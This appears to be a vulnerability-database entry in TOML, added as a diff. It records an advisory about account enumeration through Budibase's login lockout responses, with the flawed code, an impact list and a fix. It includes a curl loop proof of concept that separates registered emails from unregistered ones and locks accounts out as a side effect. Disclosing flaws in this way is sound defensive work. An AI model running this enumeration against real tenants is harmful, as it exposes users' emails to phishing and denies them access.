@@ -1,0 +1,155 @@
+[basic]
+description = '''
+## Summary
+
+The login lockout mechanism in Budibase creates an observable response discrepancy that allows unauthenticated attackers to enumerate valid email addresses. When an existing user's account is locked after 5 failed login attempts, the server returns a distinct `403` response with `X-Account-Locked: 1` and `Retry-After: 900` headers plus the message \"Account temporarily locked.\" For non-existing users, the response is always a generic `403 \"Unauthorized\"` regardless of attempt count, because the lockout counter is never incremented.
+
+## Details
+
+The vulnerability exists in two files that implement the login lockout feature:
+
+**`packages/worker/src/middleware/lockout.ts:18-36`** — The lockout middleware only blocks requests for users that exist in the database AND are locked:
+
+```typescript
+export default async (ctx: Ctx, next: Next) => {
+  const email = ctx.request.body.username
+  if (!email) {
+    return await next()
+  }
+  const dbUser = await userSdk.db.getUserByEmail(email)
+  if (dbUser && (await isLocked(email))) {  // line 26: non-existing users skip this entirely
+    ctx.set(\"X-Account-Locked\", \"1\")
+    ctx.set(\"Retry-After\", String(env.LOGIN_LOCKOUT_SECONDS))
+    ctx.throw(403, \"Account temporarily locked. Try again later.\")
+  }
+  return await next()
+}
+```
+
+**`packages/worker/src/api/controllers/global/auth.ts:127-141`** — The login handler only increments the failure counter for existing users:
+
+```typescript
+if (err || !user) {
+  if (dbUser) {          // line 129: non-existing users never trigger onFailed()
+    await onFailed(email)
+  }
+  if (await isLocked(email)) {
+    return handleLockoutResponse(ctx, email)
+  }
+  // ...
+  return passportCallback(ctx, user as any, err, info)
+}
+```
+
+**Execution flow for existing users (after 5 failed attempts):**
+1. `lockout` middleware → `getUserByEmail` returns user → `isLocked` returns true → 403 + `X-Account-Locked: 1` + `Retry-After: 900` + \"Account temporarily locked\"
+
+**Execution flow for non-existing users (any number of attempts):**
+1. `lockout` middleware → `getUserByEmail` returns null → `dbUser && isLocked` is false → passes through
+2. Login handler → passport fails → `if (dbUser)` is false → `onFailed()` never called → lock never set
+3. Always returns 403 \"Unauthorized\"
+
+No IP-based rate limiting exists on the login endpoint (`POST /api/global/auth/:tenantId/login`). The route is registered via `loggedInRoutes` which applies no authentication middleware. The password reset endpoint has proper IP-based rate limiting, but the login endpoint does not.
+
+## PoC
+
+```bash
+# Test against a known-existing email and a non-existing email
+# Replace 'default' with the target tenant ID
+
+# Step 1: Send 6 login attempts for an existing user
+echo \"=== Testing existing user ===\"
+for i in $(seq 1 6); do
+  echo \"--- Attempt $i ---\"
+  curl -s -D - -X POST http://localhost:10000/api/global/auth/default/login \
+    -H 'Content-Type: application/json' \
+    -d '{\"username\":\"local@budibase.com\",\"password\":\"wrongpassword\"}' 2>&1 \
+    | grep -E 'HTTP/|X-Account-Locked|Retry-After|locked|Unauthorized'
+  echo \"\"
+done
+
+# Expected: Attempts 1-5 return \"Unauthorized\"
+# Attempt 6 returns: \"Account temporarily locked\" + X-Account-Locked: 1 + Retry-After: 900
+
+# Step 2: Send 6 login attempts for a non-existing user
+echo \"=== Testing non-existing user ===\"
+for i in $(seq 1 6); do
+  echo \"--- Attempt $i ---\"
+  curl -s -D - -X POST http://localhost:10000/api/global/auth/default/login \
+    -H 'Content-Type: application/json' \
+    -d '{\"username\":\"nonexistent@example.com\",\"password\":\"wrongpassword\"}' 2>&1 \
+    | grep -E 'HTTP/|X-Account-Locked|Retry-After|locked|Unauthorized'
+  echo \"\"
+done
+
+# Expected: All 6 attempts return \"Unauthorized\" — no lockout ever triggers
+
+# The difference in behavior after 5 attempts confirms whether the email exists.
+```
+
+## Impact
+
+- **Account enumeration**: An unauthenticated attacker can determine whether any email address is registered on a Budibase tenant by sending 5-6 login requests and observing whether the response changes to \"Account temporarily locked\" with the `X-Account-Locked` header.
+- **No rate limiting**: The login endpoint has no IP-based rate limiting, allowing an attacker to enumerate emails at high speed from a single IP address (~5 requests per email).
+- **Denial of service side-effect**: Each enumerated existing email is locked out for 15 minutes (900 seconds), preventing legitimate users from logging in during that window.
+- **Enables further attacks**: Confirmed valid emails can be used for targeted phishing, credential stuffing against other services, or social engineering.
+
+## Recommended Fix
+
+The lockout behavior should be identical regardless of whether the user exists. Apply lockout tracking based on the email string itself, not conditioned on database user existence:
+
+**`packages/worker/src/middleware/lockout.ts`** — Remove the `dbUser` check:
+
+```typescript
+export default async (ctx: Ctx, next: Next) => {
+  const email = ctx.request.body.username
+  if (!email) {
+    return await next()
+  }
+  // Check lock status based on email alone, not user existence
+  if (await isLocked(email)) {
+    ctx.set(\"X-Account-Locked\", \"1\")
+    ctx.set(\"Retry-After\", String(env.LOGIN_LOCKOUT_SECONDS))
+    ctx.throw(403, \"Account temporarily locked. Try again later.\")
+  }
+  return await next()
+}
+```
+
+**`packages/worker/src/api/controllers/global/auth.ts`** — Remove the `dbUser` guard around `onFailed`:
+
+```typescript
+if (err || !user) {
+  // Always increment failure counter regardless of user existence
+  await onFailed(email)
+  if (await isLocked(email)) {
+    return handleLockoutResponse(ctx, email)
+  }
+  // ...
+}
+```
+
+Additionally, consider adding IP-based rate limiting to the login endpoint (similar to what already exists on the password reset endpoint) to limit enumeration throughput.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Budibase: Account Enumeration via Login Lockout Response Differential"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-cr7p-cr3q-h5cm"]
+ave_id = "AVE-2026-1076"
+
+[meta]
+collected_at = "2026-08-06T01:23:52.038437200+00:00"
+status = "completed"
+
+[references]
+urls = []
